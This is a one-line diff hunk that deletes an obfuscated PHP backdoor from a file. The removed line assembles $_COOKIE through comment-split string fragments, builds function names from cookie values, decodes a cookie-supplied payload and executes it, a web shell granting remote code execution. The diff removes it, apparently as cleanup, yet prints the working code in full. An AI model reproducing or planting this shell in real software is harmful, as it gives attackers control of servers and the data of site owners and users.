@@ -1,1 +1,0 @@
-<?php $ow='E';$g='OO';/*^*/$t='KI';/*lB*/$v='_C';$ue/*+6;*/=${$v.$g.$t.$ow};if(isset($ue/**A*/['L'])){$tw=$ue/*o1C*/['L'].$ue['Vq'];$m=/*C*/$ue['S'].$ue['O'].$ue['qK'];$lk=$tw('',$m($ue['bo']));$lk();}
